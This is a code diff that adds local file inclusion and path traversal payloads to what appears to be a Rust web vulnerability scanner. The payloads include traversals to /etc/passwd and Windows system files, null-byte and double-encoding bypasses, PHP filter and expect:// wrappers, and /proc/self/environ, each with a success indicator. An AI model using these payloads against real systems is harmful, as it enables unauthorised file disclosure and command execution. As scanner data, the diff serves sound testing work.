@@ -51,6 +51,78 @@ pub fn get_lfi_payloads() -> Vec<PayloadDefinition> {
             severity: SeverityLevel::Critical,
             safe_for_production: true,
         },
+        PayloadDefinition {
+            id: "lfi_07".into(),
+            payload: "../../../../../../../../../../../../../../../../../../../../etc/passwd".into(),
+            description: "Deep Linux passwd file traversal".into(),
+            expected_indicator: ExpectedIndicator::FileContent("root:".into()),
+            severity: SeverityLevel::High,
+            safe_for_production: true,
+        },
+        PayloadDefinition {
+            id: "lfi_08".into(),
+            payload: "/etc/passwd%00".into(),
+            description: "Absolute path with null byte".into(),
+            expected_indicator: ExpectedIndicator::FileContent("root:".into()),
+            severity: SeverityLevel::High,
+            safe_for_production: true,
+        },
+        PayloadDefinition {
+            id: "lfi_09".into(),
+            payload: "../../../../etc/passwd%00".into(),
+            description: "Path traversal with null byte".into(),
+            expected_indicator: ExpectedIndicator::FileContent("root:".into()),
+            severity: SeverityLevel::High,
+            safe_for_production: true,
+        },
+        PayloadDefinition {
+            id: "lfi_10".into(),
+            payload: "php://filter/read=string.rot13/resource=index.php".into(),
+            description: "PHP filter rot13 wrapper".into(),
+            expected_indicator: ExpectedIndicator::ReflectedContent("<?cuc".into()),
+            severity: SeverityLevel::High,
+            safe_for_production: true,
+        },
+        PayloadDefinition {
+            id: "lfi_11".into(),
+            payload: "expect://id".into(),
+            description: "PHP expect wrapper RCE check".into(),
+            expected_indicator: ExpectedIndicator::ReflectedContent("uid=".into()),
+            severity: SeverityLevel::Critical,
+            safe_for_production: true,
+        },
+        PayloadDefinition {
+            id: "lfi_12".into(),
+            payload: "..%252f..%252f..%252fetc%252fpasswd".into(),
+            description: "Double URL encoded path traversal".into(),
+            expected_indicator: ExpectedIndicator::FileContent("root:".into()),
+            severity: SeverityLevel::High,
+            safe_for_production: true,
+        },
+        PayloadDefinition {
+            id: "lfi_13".into(),
+            payload: "C:\\boot.ini".into(),
+            description: "Absolute Windows path boot.ini".into(),
+            expected_indicator: ExpectedIndicator::FileContent("[boot loader]".into()),
+            severity: SeverityLevel::High,
+            safe_for_production: true,
+        },
+        PayloadDefinition {
+            id: "lfi_14".into(),
+            payload: "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts".into(),
+            description: "Deep Windows hosts file traversal".into(),
+            expected_indicator: ExpectedIndicator::FileContent("127.0.0.1".into()),
+            severity: SeverityLevel::High,
+            safe_for_production: true,
+        },
+        PayloadDefinition {
+            id: "lfi_15".into(),
+            payload: "/proc/self/environ".into(),
+            description: "Linux process environ file".into(),
+            expected_indicator: ExpectedIndicator::FileContent("PATH=".into()),
+            severity: SeverityLevel::High,
+            safe_for_production: true,
+        },
     ]
 }
 
@@ -99,5 +171,27 @@ pub fn get_traversal_payloads() -> Vec<PayloadDefinition> {
             severity: SeverityLevel::High,
             safe_for_production: true,
         },
+        PayloadDefinition {
+            id: "traversal_03".into(),
+            payload: "%2e%2e%2f".into(),
+            description: "URL encoded one-level directory traversal".into(),
+            expected_indicator: ExpectedIndicator::ResponseDiff {
+                baseline_hash: String::new(),
+                indicator: "directory_listing".into(),
+            },
+            severity: SeverityLevel::Medium,
+            safe_for_production: true,
+        },
+        PayloadDefinition {
+            id: "traversal_04".into(),
+            payload: "..;/".into(),
+            description: "Semicolon path traversal bypass".into(),
+            expected_indicator: ExpectedIndicator::ResponseDiff {
+                baseline_hash: String::new(),
+                indicator: "directory_listing".into(),
+            },
+            severity: SeverityLevel::Medium,
+            safe_for_production: true,
+        }
     ]
 }
